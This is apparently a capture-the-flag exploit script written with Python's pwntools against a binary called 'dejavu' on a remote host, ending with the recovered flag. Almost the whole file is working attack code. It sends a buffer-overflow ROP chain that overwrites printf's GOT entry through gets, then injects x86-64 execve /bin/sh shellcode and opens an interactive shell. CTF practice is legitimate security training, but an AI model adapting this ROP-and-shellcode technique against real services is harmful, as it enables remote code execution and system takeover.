from pwn import *
import struct
context(os='linux', arch='amd64')

def getConn():
    return process('./dejavu') if local else remote('pwnd.nyanwith.me', 8000)
 
local = False
printf_GOT=	0x0601020
gets_PLT=	0x400550
popret= 	0x0400783

r = getConn()
#break *0x40070C
#gdb.attach(r, '''
#break *0x400712
#c
#''')

padding="A"*32+"B"*8
padding+=p64(popret)
padding+=p64(printf_GOT)
padding+=p64(gets_PLT)
padding+=p64(printf_GOT)
padding+=p64(printf_GOT)
#shellcode2 = asm(shellcraft.sh())
shellcode2 =  "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"
print r.recv(1024)

r.sendline(padding)
r.sendline(shellcode2)
r.sendline('id')
r.interactive()

r.close()


#UETCTF{W3lc0me_t0_t3h_w0rld_of_mem_c0rruption!}
